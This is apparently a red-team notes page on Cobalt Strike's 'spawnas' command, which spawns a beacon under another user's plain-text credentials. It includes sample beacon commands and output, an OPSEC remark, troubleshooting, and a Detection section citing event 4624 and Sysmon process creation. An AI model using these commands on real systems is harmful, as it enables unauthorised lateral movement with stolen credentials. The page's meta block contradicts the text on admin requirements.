# SpawnAs
This will spawn a new beacon process using the plain-text credentials of another user. This includes a new logon session from interactive logon type which allows you to use the privs on the machine itself.
It does not required local admin privileges.

```cmd
beacon> spawnas EDU\doe P4ssw0rd1. tcp-4444-local
[+] established link to child beacon: 10.10.17.231
```
#OPSEC It creates a user profile on disk.

⚠️ WARNING  
Do not run this from a directory where the target user does not have read access, or from a SYSTEM beacon
> 
> beacon> spawnas EDU\doe Passw0rd1 tcp-4444-local
> [-] could not run C:\Windows\system32\rundll32.exe as EDU\doe: 267
> [-] Could not connect to target
> 
> `cd` to a another directory like `C:\` and try again.

## Detection
* Event `4624: An account was successfully logged on` but with a logon type of `2` (LOGON32_LOGON_INTERACTIVE). 
    * Executing user = TargetUserName
    * Impersonated user = TargetOutboundUserName.
* Sysmon event 1 (Process Create) because Cobalt Strike spawns rundll32 by default.
>event.type: process_start and process.name: rundll32.exe

## Tools
########
########


```meta
ttp: T1000
requirements: admin
results: 
description: 
``` 